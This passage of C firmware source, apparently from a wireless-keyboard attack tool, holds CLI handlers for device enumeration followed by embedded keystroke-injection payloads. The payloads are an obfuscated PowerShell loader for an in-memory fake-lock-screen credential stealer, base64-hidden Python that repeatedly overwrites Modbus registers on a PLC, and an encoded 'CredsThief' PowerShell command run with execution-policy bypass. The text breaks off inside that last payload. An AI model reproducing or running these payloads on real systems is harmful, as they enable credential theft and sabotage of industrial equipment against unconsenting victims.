    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum USB mouse pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_mouse ? "on" : "off");
}

static void cmd_options_discover_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.discover_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.discover_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "discover raw USB pass-through: %s\r\n", g_logitacker_global_config.discover_pass_through_hidraw ? "on" : "off");
}

static void cmd_options_passiveenum_pass_raw(nrf_cli_t const *p_cli, size_t argc, char **argv)
{
    if (argc > 1)
    {
        if (strcmp(argv[1], "off") == 0 || strcmp(argv[1], "OFF") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = false;
        else if (strcmp(argv[1], "on") == 0 || strcmp(argv[1], "ON") == 0) g_logitacker_global_config.passive_enum_pass_through_hidraw = true;

    }

    nrf_cli_fprintf(p_cli, NRF_CLI_DEFAULT, "passive-enum raw USB pass-through: %s\r\n", g_logitacker_global_config.passive_enum_pass_through_hidraw ? "on" : "off");
}

static void cmd_enum_passive(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting passive enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_passive_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}

#ifdef CLI_TEST_COMMANDS
static void cmd_prx(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting PRX with address %s\r\n", tmp_addr_str);
        logitacker_enter_mode_prx(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}
#endif

static void cmd_enum_active(nrf_cli_t const * p_cli, size_t argc, char **argv) {
    if (argc > 1)
    {

        //parse arg 1 as address
        uint8_t addr[5];
        if (helper_hex_str_to_addr(addr, 5, argv[1]) != NRF_SUCCESS) {
            nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
            return;
        }

        char tmp_addr_str[16];
        helper_addr_to_hex_str(tmp_addr_str, 5, addr);
        nrf_cli_fprintf(p_cli, NRF_CLI_VT100_COLOR_GREEN, "Starting active enumeration for device %s\r\n", tmp_addr_str);
        logitacker_enter_mode_active_enum(addr);
        return;
    } else {
        nrf_cli_fprintf(p_cli, NRF_CLI_ERROR, "invalid address parameter, format has to be xx:xx:xx:xx:xx\r\n");
    }
}


#define MAX_CC_PAY_SIZE 16

const char psSharpLocker[] = "powershell\n$b=\"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\";nal no New-Object -F;$m=no IO.MemoryStream;(no IO.Compression.GZipStream((no IO.MemoryStream -ArgumentList @(,[Convert]::FromBase64String($b))), [IO.Compression.CompressionMode]::Decompress)).CopyTo($m);[System.Reflection.Assembly]::Load($m.ToArray()) | Out-Null;[Windows.System.UserProfile.LockScreen,Windows.System.UserProfile,ContentType=WindowsRuntime] | Out-Null;[SharpLockerLib.Runner]::Run([Windows.System.UserProfile.LockScreen]::OriginalImageFile.AbsolutePath);exit";

const char PwnPLC[] = "python -c \"import base64; exec(base64.b64decode('ZnJvbSBweW1vZGJ1cy5jbGllbnQuc3luYyBpbXBvcnQgTW9kYnVzVGNwQ2xpZW50IGFzIE0NCmZyb20gcHltb2RidXMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkV4Y2VwdGlvbg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KYz1NKCcxOTIuMTY4LjIyMy4xMjgnLCBwb3J0PTUwMjApDQp3aGlsZSBUcnVlOg0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAxLCAxKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDAyLCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA0LCAwKQ0KICAgIHJxID0gYy53cml0ZV9yZWdpc3RlcigweDA2LCAwKQ=='))\"";

const char PwnPLC120s[] = "python -c \"import base64; exec(base64.b64decode('ZnJvbSBweW1vZGJ1cy5jbGllbnQuc3luYyBpbXBvcnQgTW9kYnVzVGNwQ2xpZW50IGFzIE0NCmZyb20gcHltb2RidXMuZXhjZXB0aW9ucyBpbXBvcnQgQ29ubmVjdGlvbkV4Y2VwdGlvbg0KaW1wb3J0IG9zDQppbXBvcnQgc3lzDQppbXBvcnQgdGltZQ0KYz1NKCcxOTIuMTY4LjIyMy4xMjgnLCBwb3J0PTUwMjApCnRfZW5kID0gdGltZS50aW1lKCkgKyAxMjAKd2hpbGUgdGltZS50aW1lKCkgPCB0X2VuZDoNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwMSwgMSkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwMiwgMCkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwNCwgMCkNCiAgICBycSA9IGMud3JpdGVfcmVnaXN0ZXIoMHgwNiwgMCk='))\"";

const char CredsThief[] = "powershell.exe -ep bypass -c \"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('3Rtrc5tI8rNVpf8wq7jKkMhYcfZpJ1tLZBxTq1eBnOTO51JhaSSxQaAF5Mdm/d+v5wEMMAjtrXdzd6pUGZienn53T8+k2XgW4l83bogjdHiLw8gNfHTcbDQbr5+h8RBZlwM0vjBtZHctczQ+Qdq/uiGe9R1fW0cv0bMfCejICZ1Vs6E0G3tX9BnHOFQAZubEQfjwZn/ueBFWr6/sOzeeLq/Rvr0MCJpmQ20SAhZk1ZHr3wafcPbB9D3Xx6j7rNm4suPQ9RcwcxSRiSvHv4xdL0Jv0E+tZmMTwSCyH6IYr07zr5q18WN3hTXTB6KCtY3DW3eKo1NCuA+kRmtnitEooviajc/NBoLfenPjuVM09ZwoQpxjNsIByC8ldLUOwjjKBo6O0Jnnsc9ohkP3FsQ7D4NVDVEZhqt0vtLSZ7fO2n11rM08r9VGNo57ThQbYRiEwH8cbnAbGX4cPowC14/hU4sQfIY9UMMHmNBdOiFMggH+pF367jSYgUayBddApBNjFMVODIzjeyDMRzdB4CEBm3Jl+tcAQ5SBYidc4LiN6LeuZZxNxv8YGSh+WGP+kZADlgXc4dm55yxUKvWn49HwNyscOk/HZoYwx+m56wGcwBRhJmqjYBPT124A+mSvoNFRHFJkGHTsePD21Gyfhxi36rm6DdwZSuAZP5y6KXx8aqIs7MyeSg0U15+0tb9PHR9C9+kskCFjvId4LlCONsBc9srZvgQOXx2jOTFIwlgam7A/Y+FJZDaJWOcu9mZCuOHhDoP5M+me9/R3NjpBG+AzAxNiH/kNhgMDmO3cd9r5gZE17I/Gk8HwAx0+Lgxf2oY10PvGZKxb74wxhfk6A3kUKS5RZljW0KoljUJN7Mtu17BtKY0Mwhy813vm2WSkW0DQ2LAo7PedznedzjffbZ3CRJSCvzK6UvDBcDw5H14OzjLQr3+QEzMYEoovJr3hu+FgYgPl5nCQTfvmWD7trX42SUSaQX//g76rSEeGZZv2uE6mGUEvC3T0hl29N+nr3QuTWkRR4cYAJDuyTJsMvtqVLOrhNTS9MwaGZXYlNJ0N+7o5AMXa9oehdSahikN0DWtsnptdfUypkwO9N23zbc8Q0X3dlpJSwPeNHJ/xcWwMzgyC59sCRF//aPYv+zDyXZt9gXKi79y7KxBMtFmTUIVnNIbT+CedDQsAAiXB9QK97HQ6apvi0j0vuEM+vkPOeg0ihzgU+BGKAxRufATRIfBmaGiL5UhOUaQY20whND5AhFXYn59df6bZUEkmwWm3WMhUHlF8QqirVDefIIQomolPq6GoEY1BTHIYnl7GNL0MoBzcCtYNViugUA5zBlF9DEUdIjmDhPEY+3JIHrMzft96wY3t/lazeA58C8uJO49IOR9VUMtp0GNAfrOJMS1h5KA8h6agFeLOiVL3XGc73CVks4LA/yorSzMuNbMB2Pst/hLGxgVZZ2xJzbLN2LbvIzSYS8iItHOzZ4xNyAtPbZSlwqraKDnmv9kcc8LeYo4cTm6OyeP2aqq7dCFidslesWx1yRbShWrP8TJ5XcD22MOQ3/ruNAyiYB5rH1wfak/bmW